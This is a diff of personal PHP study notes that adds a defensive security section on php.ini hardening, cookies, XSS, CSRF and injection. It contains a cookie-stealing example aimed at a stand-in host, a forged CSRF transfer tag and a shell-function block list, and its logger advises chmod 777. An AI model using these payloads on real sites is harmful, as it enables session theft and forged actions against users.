@@ -5,54 +5,54 @@ PHP notes from courses and web finds.
 **Table of Contents**
 
 - [PHP language related and other tips](#php-language-related-and-other-tips)
-  - [static variables in functions](#static-variables-in-functions)
-  - [self vs static](#self-vs-static)
-  - [Callable formats](#callable-formats)
-  - [Shorthand for assigning instance variables in constructor (PHP8 only)](#shorthand-for-assigning-instance-variables-in-constructor-php8-only)
-  - [No objects as array keys](#no-objects-as-array-keys)
-  - [Arrays are assigned by value](#arrays-are-assigned-by-value)
-  - [modify array in foreach loop](#modify-array-in-foreach-loop)
-  - [array_map with multiple arguments](#array_map-with-multiple-arguments)
-  - [Most basic autoloader](#most-basic-autoloader)
-  - [Clone objects with clone keyword](#clone-objects-with-clone-keyword)
-  - [curly braces inside Strings](#curly-braces-inside-strings)
-  - [Array dereferencing (=destructuring / unpacking)](#array-dereferencing-destructuring--unpacking)
-  - [Splat operator / unpacking arrays and traversable objects](#splat-operator--unpacking-arrays-and-traversable-objects)
-  - [Variable functions](#variable-functions)
-  - [Reminder: arrays are not like other objects](#reminder-arrays-are-not-like-other-objects)
-  - [var_export vs var_dump](#var_export-vs-var_dump)
-  - [Iterate over the last X lines of a SplFileObject](#iterate-over-the-last-x-lines-of-a-splfileobject)
-  - [str_replace accepts also arrays for all of its arguments](#str_replace-accepts-also-arrays-for-all-of-its-arguments)
-  - [Regex capture groups with preg_replace](#regex-capture-groups-with-preg_replace)
-  - [type hinting in foreach loops](#type-hinting-in-foreach-loops)
-  - [authentication / pw hashing](#authentication--pw-hashing)
-  - [preventing xss attacks](#preventing-xss-attacks)
-  - [redirecting](#redirecting)
-  - [DateTime magic](#datetime-magic)
-  - [Email header injection attacks](#email-header-injection-attacks)
-  - [Backticks](#backticks)
-  - [Disable dangerous PHP functions](#disable-dangerous-php-functions)
-  - [Variable variables](#variable-variables)
-  - [DateTime from unix timestamp](#datetime-from-unix-timestamp)
-  - [Sort arrays on multiple criteria (PHP5+) and spaceship operator (php7+)](#sort-arrays-on-multiple-criteria-php5-and-spaceship-operator-php7)
-  - [Generators](#generators)
-  - [Web scraping](#web-scraping)
-  - [sscanf to extract parts of a string without regex](#sscanf-to-extract-parts-of-a-string-without-regex)
-  - [Randomization](#randomization)
+    - [static variables in functions](#static-variables-in-functions)
+    - [self vs static](#self-vs-static)
+    - [Callable formats](#callable-formats)
+    - [Shorthand for assigning instance variables in constructor (PHP8 only)](#shorthand-for-assigning-instance-variables-in-constructor-php8-only)
+    - [No objects as array keys](#no-objects-as-array-keys)
+    - [Arrays are assigned by value](#arrays-are-assigned-by-value)
+    - [modify array in foreach loop](#modify-array-in-foreach-loop)
+    - [array_map with multiple arguments](#array_map-with-multiple-arguments)
+    - [Most basic autoloader](#most-basic-autoloader)
+    - [Clone objects with clone keyword](#clone-objects-with-clone-keyword)
+    - [curly braces inside Strings](#curly-braces-inside-strings)
+    - [Array dereferencing (=destructuring / unpacking)](#array-dereferencing-destructuring--unpacking)
+    - [Splat operator / unpacking arrays and traversable objects](#splat-operator--unpacking-arrays-and-traversable-objects)
+    - [Variable functions](#variable-functions)
+    - [Reminder: arrays are not like other objects](#reminder-arrays-are-not-like-other-objects)
+    - [var_export vs var_dump](#var_export-vs-var_dump)
+    - [Iterate over the last X lines of a SplFileObject](#iterate-over-the-last-x-lines-of-a-splfileobject)
+    - [str_replace accepts also arrays for all of its arguments](#str_replace-accepts-also-arrays-for-all-of-its-arguments)
+    - [Regex capture groups with preg_replace](#regex-capture-groups-with-preg_replace)
+    - [type hinting in foreach loops](#type-hinting-in-foreach-loops)
+    - [authentication / pw hashing](#authentication--pw-hashing)
+    - [preventing xss attacks](#preventing-xss-attacks)
+    - [redirecting](#redirecting)
+    - [DateTime magic](#datetime-magic)
+    - [Email header injection attacks](#email-header-injection-attacks)
+    - [Backticks](#backticks)
+    - [Disable dangerous PHP functions](#disable-dangerous-php-functions)
+    - [Variable variables](#variable-variables)
+    - [DateTime from unix timestamp](#datetime-from-unix-timestamp)
+    - [Sort arrays on multiple criteria (PHP5+) and spaceship operator (php7+)](#sort-arrays-on-multiple-criteria-php5-and-spaceship-operator-php7)
+    - [Generators](#generators)
+    - [Web scraping](#web-scraping)
+    - [sscanf to extract parts of a string without regex](#sscanf-to-extract-parts-of-a-string-without-regex)
+    - [Randomization](#randomization)
 - [Intellij / PHPStorm related](#intellij--phpstorm-related)
-  - [resolving tables sql](#resolving-tables-sql)
+    - [resolving tables sql](#resolving-tables-sql)
 - [Database centric PHP stuff](#database-centric-php-stuff)
-  - [PDO prepared statements debugging](#pdo-prepared-statements-debugging)
-  - [insert or update if exists](#insert-or-update-if-exists)
-  - [Auto incremented indexes out of range](#auto-incremented-indexes-out-of-range)
-  - [use exceptions to avoid unnoticed errors](#use-exceptions-to-avoid-unnoticed-errors)
+    - [PDO prepared statements debugging](#pdo-prepared-statements-debugging)
+    - [insert or update if exists](#insert-or-update-if-exists)
+    - [Auto incremented indexes out of range](#auto-incremented-indexes-out-of-range)
+    - [use exceptions to avoid unnoticed errors](#use-exceptions-to-avoid-unnoticed-errors)
 - [PHP and Database version upgrades](#php-and-database-version-upgrades)
-  - [Upgrading from PHP 5 to 7](#upgrading-from-php-5-to-7)
+    - [Upgrading from PHP 5 to 7](#upgrading-from-php-5-to-7)
 - [Security](#security)
-  - [Overview](#overview)
-  - [Securing the PHP installation](#securing-the-php-installation)
-  - [Keeping versions up to date](#keeping-versions-up-to-date)
-  - [$_SERVER variable](#_server-variable)
+    - [Overview](#overview)
+    - [Securing the PHP installation](#securing-the-php-installation)
+    - [Keeping versions up to date](#keeping-versions-up-to-date)
+    - [$_SERVER variable](#_server-variable)
 - [Frameworks](#frameworks)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
@@ -81,12 +81,8 @@ subsequent function calls.
 - `self` indicates the class where it is written in the code (resolved at compile time)
 - `static`indicates the class that is using it at runtime (meaning it can refer to subclasses)
 
-  class A { public static function get_self() { return new self(); }
-
-        public static function get_static() {
-            return new static();
-        }
-  }
+  class A { public static function get_self() { return new self(); } public static function get_static() { return new
+  static(); } }
 
   class B extends A {}
 
@@ -700,7 +696,8 @@ Main breaking changes:
 
 # Security
 
-Mostly notes from "php - creating secure websites" by Kevin Skoglund on linkedin learning
+Mostly notes from "php - creating secure websites" by Kevin Skoglund on linkedin learning; unrelated specific items at
+the end of this section.
 
 ## Overview
 
@@ -737,7 +734,320 @@ Primary security principles:
 
 ## Securing the PHP installation
 
-## Keeping versions up to date
+### Keeping versions up to date
+
+- easiest and most important security measure
+- applies to PHP, web server, database, libraries, frameworks etc.
+- Dev and live servers must use the same versions
+- **Write tests to make upgrades easier!**
+- get notified about updates
+
+### phpinfo and phpMyAdmin
+
+- Never make phpinfo() or the phpmyadmin site public (duh) or at secure them with a login
+- phpmyadmin: remove the setup directory after the initial setup
+- set up mysql allow and deny rules so people don't have access to the entire database if they crack the login
+- use authentication proxy and captchas
+- best is to keep these off the public web production server
+
+### Configure error reporting and logging
+
+Main settings to configure PHP error reporting (in php.ini or in code):
+
+- `display_errors` (if errors should be shown in browser)
+- `log_errors` (if errors should be logged)
+- `error_log` (path to log file)
+    - `error_log = /path/to/errors.log`
+    - `error_log = syslog` (uses the system log in linux)
+- `error_reporting` (*what* errors are should be shown by PHP):
+    - `E_ERROR`: fatal errors
+    - `E_PARSE`: parse errors
+    - `E_WARNING`: nonfatal errors
+    - `E_NOTICE`: possible errors
+    - `E_STRICT`: suggested improvements
+    - `E_DEPRECATED`: code scheduled for removal in future PHP versions
+    - `E_ALL`: all of the above
+    - These can be combinde with OR (`|`), e.g. `E_ERROR|E_PARSE` and with NOT (`^`), e.g.
+      `E_ALL^E_DEPRECATED` for all errors except deprecation errors; parenthesis can be used in the logical operations,
+      e.g. `E_ALL^(E_NOTICE|E_DEPRECATED|E_STRICT)`
+
+It's good practice to have separate settings (php.inis) for development and production:
+
+- Development (example):
+    - display_errors = On
+    - log_errors = Off
+    - error_reporting = E_ALL
+- Production:
+    - `display_errors` = Off (no clues to users / hackers about what might be wrong with the code)
+    - `log_errors` = On (but we want to see it)
+    - `error_reporting` = E_ALL if we have no known deprecations or are aware of code that produces; if we do, the log
+      might get spammed by "errors" we already know and don't care about, so we might want to reduce them to the ones we
+      don't expect like `E_ERROR|E_PARSE|E_WARNING`
+
+### Other php.ini configurations
+
+- `expose_php = Off`: don't show PHP version to client in head (`X-Powered-by`); The apache+PHP version in `Server`
+  entry in the response header must be disabled in the web server configuration (`ServerSignature Off` and
+  `ServerTokens Prod` in `httpd.conf` or `apache2.conf`, depending on the linux version)
+  . [article apache server response header](https://ubiq.co/tech-blog/remove-server-name-apache-response-header/)
+- Limiting configurations:
+    - memory_limit, post_max_size, max_execution_time, max_input_time
+- Disabling configurations functions targeting underlying OS:
+    - `disable_functions=show_source, exec, shell_exec, system, passtrhu, proc_open, popen`
+    - `enable_dl=Off` (turns off dynamic loading of PHP extensions)
+- File configurations
+    - `file_uploads=On`, `max_file_uploads`, `upload_max_filesize`, `open_basedir`, `upload_tmp_dir`
+- Remote file configurations `allow_url_fopen = Off`, `allow_url_include = Off` to not let PHP parse code from outside
+  the server
+
+### PHP on a shared host
+
+- configure on php.ini if possible
+- if not, use the `ini_set` function to configure at runtime
+- put everything in one separate configuration file that gets included at the very beginning
+- today, usually sites are hosted on virtual private servers where the php.ini is accessible
+
+## Filtering input and controlling output
+
+### Validate input
+
+- Determine data expectations
+- Consider application and database requirements
+- Which data, what format, what values
+- Only allow expected data submissions
+- set default values
+
+Example of script only evaluating expected data, setting default values (null) if they don't exist and ignoring all
+others:
+
+    function extract_get_params($allowed_params=[]) {
+        $allowed_array = [];
+        foreach($allowed_params as $param) {
+            if(isset($_GET[$param])) {
+                $allowed_array[$param] = $_GET[$param];
+            } else {
+                $allowed_array[$param] = NULL;
+            }
+        }
+        return $allowed_array;
+    }
+    
+    $params = extract_get_params(['username', 'password']);
+
+Common validations:
+
+- presence
+- length
+- type
+- format (e.g. email)
+- within a set of values
+- uniqueness (e.g. username)
+
+See `validation_functions.php` and `validation_tests.php` for examples. Questionable naming imo.
+
+### Sanitizing data
+
+- converts harmful data / input into harmless data
+- encoding characters: replaces potentially harmful characters (such as `", ', \` etc, into harmless equivalents)
+- escaping characters: adds escape characters before characters (e.g. `\'`)
+- Don't write custom sanitization functions; use PHP functions instead
+- don't remove or correct invalid data
+
+PHP sanitization functions and the filter variables for `filter_var`
+
+![PHP sanitization functions](readme_images/sanitization.png)
+
+Also see examples in `sanitization` folder.
+
+### Keeping code private
+
+- Keep code in private and public directory, e.g. the front controller (index.php) in the public directory (can be set
+  with `DocumentRoot` / `root` in apache and nginx respectively, the rest in a private one not served by apache but
+  accessible by the php parser via the filesystem.
+- Keep credentials private and secure in a single file and don't add them to git, or use an environment variable
+- protect directories by keeping an index.php in every directory so directory content isn't accidentally served by the
+  webserver
+
+### Smart logging
+
+- log errors, sensitive actions and possible attacks
+
+Example logger:
+
+    // log file must exist and have permissions set that allow writing
+    // Example in Unix: chmod 777 errors.log
+    $log_file = 'errors.log';
+    
+    // An ultra-simple file logger
+    function logger($level="ERROR", $msg="") {
+        global $log_file;
+    
+        // Ensure all messages have a final line return
+        $log_msg = $level . ": " . $msg . PHP_EOL;
+    
+        // FILE_APPEND adds content to the end of the file
+        // LOCK_EX forbids writing to the file while in use by us
+        file_put_contents($log_file, $log_msg, FILE_APPEND | LOCK_EX);
+    }
+    
+    logger("ERROR", "An unknown error occurred");
+    logger("DEBUG", "x is 1");
+    
+    echo "Logged";
+    
+    
+    // Other loggers you can try:
+    // https://github.com/Seldaek/monolog
+    // https://github.com/apache/logging-log4php
+    // https://github.com/katzgrau/KLogger
+    // https://github.com/jbroadway/analog
+
+### Cookie configuration
+
+- cookie data is visible to user
+- cookies can be stolen using XSS attack, e.g. by executing a javascript call in the context of the real site
+  (`http://hacker.com/?steal=' + document.cookie`)
+- can be observed in network traffic (non-SSL)
+- Don't store sensitive information in cookies
+
+Secure cookies by
+
+- setting an expiration date
+- set cookie domain and path
+- use HttpOnly cookies
+- use HTTPS and secure cookies
+
+All these can be set with `setcookie`:
+
+    // Secure cookie example
+    // setcookie(name, value, expire, path, domain, secure, httponly)
+    //
+    // Pass in NULL for params to use default values
+    // Defaults:
+    //   expire = 0 (expires when browser closes)
+    //   path = (current directory)
+    //   domain = (current domain)
+    //   secure = false
+    //   httponly = false (note: not respected by all browsers)
+    
+    $name = 'lang';
+    $value = 'en';
+    $expire = time() + 60*60*24*7; // 1 week from now
+    $path = '/store';
+    $domain = 'www.mysite.com';
+    $secure = isset($_SERVER['HTTPS']);
+    $httponly = true; // JavaScript can't access cookie
+    
+    setcookie($name, $value, $expire, $path, $domain, $secure, $httponly);
+
+## Defending against the most common attacks
+
+### Cross-site scripting (XSS)
+
+= tricking a page to run someone else's javascript code
+
+Solution: sanitize any dymamic text that gets output to the browser. This applies to data from forms, URLs, from the
+database, cookies, sessions or from files.
+
+Example functions for sanitization:
+
+    // Sanitize for HTML output
+    function h($string) {
+        return htmlspecialchars($string);
+    }
+    
+    // Sanitize for JavaScript output
+    function j($string) {
+        return json_encode($string);
+    }
+    
+    // Sanitize for use in a URL
+    function u($string) {
+        return urlencode($string);
+    }
+    
+    // Usage examples, leave commented out
+    // echo h("<h1>Test string</h1><br />");
+    // echo j("'}; alert('Gotcha!'); //");
+    // echo u("?title=Working? Or not?");
+
+### Cross-site request forgery (CSRF)
+
+- Hacker tricks users into making a request to your server
+- can take advantage of users logged-in state to perform privileges actions
+
+Example:
+
+- user leaves his banking site without logging out
+- user visits in the same browser session another site that includes an image tag that performs an action on the banking
+  site in the name of the user, e.g. `<img src="bank.com/transfer?amount=1000&to=12345" />`
+
+Protections:
+
+- GET requests should be indempotent (make not changes and can be calles repeatedly)
+- only POST requests should be able to make changes
+- Store a token in the user's session and a hidden form field can be added with the token as the value; then the
+  submitted and the session form token can be compared (like in Django: `<form method="post">{% csrf_token %}`); if they
+  match, the form was generated by the right website for this specific user
+- track token generation time in user's session
+
+See `csrf` folder for example.
+
+### SQL injection
+
+- hacker is able to execute arbitrary SQL statements
+- Give limited privileges to application's database user
+- sanitize input for SQL
+- use prepared statements
+
+See `SQL_injection` folder for sanitization and prepared statement examples.
+
+### Session hijacking and fixation
+
+Sessions store data on the server and store a session ID in a cookie in the browser
+
+- Session hijacking: session token is stolen to impersonate the user, e.g. by sniffing out network traffinc in an open
+  WLAN
+- Session fixation: tricks user into using a hacker-provided session ID
+
+Solution:
+
+- never accept session IDs from anything than cookies
+- use HttpOnly cookies
+- require HTTPS
+
+These can be set in `php.ini` and / or in the script.
+
+php.ini:
+![php ini settings for sessions](readme_images/sessionsettings.png)
+
+script:
+
+    // must be set before session_start
+    session_set_cookie_params(expire, path, domain, secure, httponly)
+
+- regenerate the session identifier periodically at key points, e.g. directly after login
+- expire and remove old session files regularly
+- keep track of last activity in session
+
+See `session_hijacking_functions.php` for examples.
+
+### Remote system execution
+
+Hacker runs OS commands on a web server.
+
+PHP System execution functions: `exec, passthru, popen, proc_open, shell_exec, system, ` `` (backtics)
+
+- Avoid using these funtions or use with extreme caution;
+- if not used, disable them in php.ini with `disable_functions`
+- use [escapeshellcmd](https://www.php.net/manual/en/function.escapeshellcmd.php) and related (see link) to sanitize
+
+### PHP code injection
+
+- Remotely execute arbitrary PHP code
+- by `eval` (don't use it or don't use dynamic functions)
+- by remote file inclusion (`include`, `require`); use allow list for files or parts of filenames (such as not allowing
+  strings with dots or slashes in them)
 
 ## $_SERVER variable
 
